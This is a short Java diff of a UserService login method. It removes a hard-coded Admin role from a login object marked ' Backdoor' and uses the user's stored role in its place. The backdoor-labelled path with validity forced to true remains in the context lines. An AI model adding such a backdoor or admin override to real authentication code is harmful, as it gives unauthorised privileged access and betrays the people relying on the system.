@@ -77,7 +77,7 @@ public class UserService {
                 new LoginDto.LoginDtoBuilder()
                     .withUsername(user.get().getUsername() + " Backdoor")
                     .withId(user.get().getId())
-                    .withUserRoleName(UserRoleName.Admin)
+                    .withUserRoleName(user.get().getUserRoleName())
                     .withIsValid(true)
                     .build()
             );
